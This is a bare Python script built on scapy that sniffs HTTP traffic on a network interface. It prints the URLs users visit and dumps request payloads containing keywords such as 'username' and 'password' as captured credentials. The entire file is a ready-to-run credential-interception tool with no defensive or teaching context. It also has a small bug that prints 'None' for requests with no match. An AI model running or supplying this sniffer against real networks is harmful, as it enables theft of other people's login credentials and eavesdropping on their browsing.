#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
   scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['test', 'uname', 'username', 'email', 'pass', 'password']
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        print("[+] URL User is visiting: " + str(url))

        get_login = str(get_login_info(packet))
        if get_login:
            print("\n\n [+] Potential Username and Password: " + get_login + "\n\n")







sniff("eth0")